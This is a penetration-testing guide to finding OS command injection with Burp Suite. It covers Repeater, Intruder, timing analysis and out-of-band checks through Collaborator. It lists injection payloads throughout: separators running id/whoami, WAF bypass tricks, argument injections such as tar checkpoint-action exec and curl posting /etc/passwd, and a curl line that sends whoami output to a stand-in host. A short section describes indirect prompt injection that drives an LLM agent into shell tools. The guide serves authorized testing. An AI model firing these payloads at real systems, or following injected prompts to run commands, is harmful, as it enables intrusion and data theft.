# Burp Suite Testing Guide: OS Command Injection (RCE)

## Objectives
- Systematically detect and validate OS command injection using Burp Suite.
- Provide a repeatable workflow with Intruder, Repeater, and Logger.

## Setup
- Target scope: Include only authorized hosts/paths for this module.
- Tools: Repeater, Intruder, Logger, Comparer, Sequencer (for timing analysis), and Collaborator (for OAST).
- Optional: Install extensions like Logger++, Turbo Intruder, and Param Miner.

## Recon and Traffic Capture
1) Proxy the target app and identify candidate endpoints:
   - Network utilities (ping, traceroute), conversion tools (convert/ffmpeg), search/filters piping to shell, backup/export features.
   - Parameters in query, body (form or JSON), headers (User-Agent, X-Forwarded-For), multipart filenames, path segments.
2) Send promising requests to Repeater for controlled testing.

## Manual Testing with Repeater
1) Establish baseline response and timing.
2) Inject separator payloads at suspected sinks and compare responses.
   - Linux: ;, |, &&, ||, &, $(id), `id`, %0A newlines
   - Windows: &, &&, |, ||, %0D%0A, PowerShell invocations
3) Observe indicators:
   - Response time increase (time-based), error traces (sh: 1: id: not found), output inclusion (whoami, uname), or status code changes.
4) Use Comparer to diff baseline vs injected responses for subtle differences.

Example payload set
- ; id
- && whoami
- | uname -a
- $(sleep 5)
- %0a id
- & timeout /t 5

## Automated Fuzzing with Intruder
1) Positions: Place payload markers at parameters of interest (param, header values, filename, path segments).
2) Payloads: Use a curated list from this module’s Payloads.md; include separators, time-based, and encoding variants.
3) Grep - Match: Add matchers for keywords like id, uid=, whoami, Linux/Windows error strings, or custom canaries (echo 1337RCE).
4) Grep - Extract: Extract response times or echoed outputs for analysis.
5) Resource pool: Throttle requests to avoid DoS. Use rate limiting and retries.
6) Analyze: Sort on response length, status, and time to find outliers.

## Timing Analysis
- Use Repeater’s timing and send N=3–5 repeats for each time-based payload.
- For more robust analysis, use Turbo Intruder with delays and statistical comparison.
- Control payloads: ;aaaaaaaa or |"" should not cause delays.

## Encoding and Bypass Tests
- URL-encode separators (%3B, %7C, %26%26), double-encode, or use Unicode alternatives.
- Space bypasses: ${IFS}, tabs (%09), or line-breaks.
- For WAFs, try case variations and benign prefixes/suffixes.

## OAST with Collaborator
- Configure Collaborator client.
- Payloads:
  - ; nslookup <canary>.<your-collab-id>
  - & curl http://<your-collab-id>/?u=$(whoami)
- Monitor Collaborator for DNS/HTTP interactions confirming blind execution.

## Header and File Upload Testing
- Headers: Test User-Agent, X-Forwarded-For, Referer, and custom headers in Repeater.
- File uploads: Manipulate filenames, MIME boundaries, and metadata. Example filename: test.txt;id

## JSON and Nested Structures
- Use Repeater’s JSON mode to insert payloads into nested fields. Test arrays and objects.
- For GraphQL, inject into arguments and variables in the query/mutations.

## 2026 Modern & Argument Injection Testing Workflows
- **Argument Injection (CWE-88)**:
  - Many modern backends invoke subprocesses with `shell=False` or fixed binaries (e.g. `git`, `tar`, `curl`, `pdf2text`).
  - Test injecting arguments starting with `--` or `-`:
    - Git: `--upload-pack="id"` or `--output=/tmp/owned`
    - Tar: `--checkpoint=1 --checkpoint-action=exec=whoami`
    - Curl: `-o /var/www/html/test.txt -d @/etc/passwd`
- **AI Agent Tool-Calling & Prompt Injection to RCE**:
  - In webapps integrating LLM agents (e.g. support bots or developer assistants with tool access), inspect tool-call invocation payloads.
  - Test if indirect prompt injection leads the agent to invoke bash/terminal tools with unsanitized arguments.
- **AI-Assisted Burp Scripting**:
  - Right-click suspected sinks in Repeater, copy as cURL, and prompt an AI assistant to generate precise non-destructive time-delay verification scripts (`sleep 5` vs `sleep 0`) to confirm blind injection without destructive side-effects.

## Reporting within Burp
- Use Issue definitions: categorize as High/Critical with CWE-78.
- Provide detailed evidence: request/response pairs, timings, Collaborator interactions, and replayable Repeater tabs.
- Remediation: reference this module’s Remediation.md.

## Checklist
- Baseline established and documented.
- Separators and command substitution tested across parameters/headers.
- Time-based, encoding, and WAF bypass variants attempted.
- OAST attempted where safe and permitted.
- Evidence collected with screenshots and saved Repeater requests.
